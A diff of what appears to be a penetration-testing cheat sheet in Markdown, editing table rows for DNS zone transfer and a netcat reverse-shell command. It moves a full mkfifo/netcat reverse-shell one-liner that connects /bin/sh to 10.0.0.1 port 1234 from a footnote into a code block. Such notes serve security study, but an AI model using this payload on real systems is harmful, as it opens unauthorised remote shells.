@@ -16,7 +16,7 @@
     <td>dns zone transfer</td>
   </tr>
   <tr>
-    <td>nc <i>ip port</i> -e <i>shell</i>[^1]</td>
+    <td>nc <i>ip port</i> -e <i>shell</i></td>
     <td>start reverse shell: cmd.exe, /bin/sh</td>
   </tr>
   <tr>
@@ -33,8 +33,11 @@
   </tr>
 </table>
 
-[^1]: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`
+
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbNDYyMjczNDk4LDIxODkwMTY4NCwtMTcyMj
-Q1MDQwMywtMTk2NjU4ODUxNV19
+eyJoaXN0b3J5IjpbMTY5MTM4Njc5MCwyMTg5MDE2ODQsLTE3Mj
+I0NTA0MDMsLTE5NjY1ODg1MTVdfQ==
 -->
